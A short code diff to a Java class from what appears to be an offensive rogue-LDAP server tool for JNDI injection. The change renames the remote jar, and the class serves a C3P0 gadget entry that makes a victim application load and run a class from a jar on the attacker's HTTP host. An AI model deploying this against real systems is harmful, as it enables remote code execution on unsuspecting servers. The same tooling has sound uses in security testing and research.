@@ -32,10 +32,9 @@ import static artsploit.Utilities.serialize;
 @LdapMapping(uri = { "/o=c3p0" })
 public class C3p0 implements LdapController {
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
-
         System.out.println("Sending LDAP ResourceRef result for " + base );
 
-        String classloaderUrl = "http://" + Config.hostname + ":" + Config.httpPort + "/xExportObject.jar";
+        String classloaderUrl = "http://" + Config.hostname + ":" + Config.httpPort + "/xExportObject-sleepless.jar";
 
         String overrideString = makeC3P0UserOverridesString(classloaderUrl, "xExportObject");
         Entry e = new Entry(base);
